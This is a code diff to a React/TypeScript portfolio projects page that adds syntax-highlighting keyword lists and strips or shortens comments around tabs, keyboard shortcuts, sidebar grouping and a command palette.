   py: ["def", "import", "from", "if", "elif", "else", "for", "while", "return", "with", "as", "in", "try", "except", "class", "True", "False", "None", "lambda", "and", "or", "not", "pass"],
   js: ["function", "const", "let", "var", "if", "else", "for", "while", "return", "import", "from", "export", "class", "new", "true", "false", "null", "undefined"],
@@ -1068,10 +1574,6 @@ function highlight(line: string, lang: FileEntry["lang"]) {
   return <>{tokens}</>;
 }
 
-/* ─────────────────────────────────────────────────────────────────
-   Page
-   ───────────────────────────────────────────────────────────────── */
-
 function ProjectsPage() {
   const [activeId, setActiveId] = useState<string>(PROJECTS[0].id);
   const [openTabs, setOpenTabs] = useState<Record<string, string[]>>({
@@ -1097,7 +1599,6 @@ function ProjectsPage() {
   const currentTab = activeTab[activeId] ?? tabs[0];
   const currentFile = activeProject.files.find((f) => f.name === currentTab) ?? activeProject.files[0];
 
-  /* keyboard shortcuts: Ctrl+P palette, Ctrl+Tab cycle tabs, Esc close palette */
   useEffect(() => {
     const onKey = (e: KeyboardEvent) => {
       if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "p") {
@@ -1183,7 +1684,6 @@ function ProjectsPage() {
     });
   };
 
-  /* group projects by domain for sidebar */
   const grouped = useMemo(() => {
     const byDomain: Record<string, Project[]> = {};
     PROJECTS.forEach((p) => {
@@ -1192,7 +1692,6 @@ function ProjectsPage() {
     return byDomain;
   }, []);
 
-  /* command palette filter */
   const paletteResults = useMemo(() => {
     const q = paletteQuery.toLowerCase().trim();
     if (!q) return PROJECTS.slice(0, 8);
@@ -1228,7 +1727,7 @@ function ProjectsPage() {
         </div>
       </Reveal>
 
-      {/* ═════ MOBILE PROJECT SELECTOR ═════ */}
+      {/* Mobile Project Selector */}
       <div className="mt-6 lg:hidden">
         <button
           onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
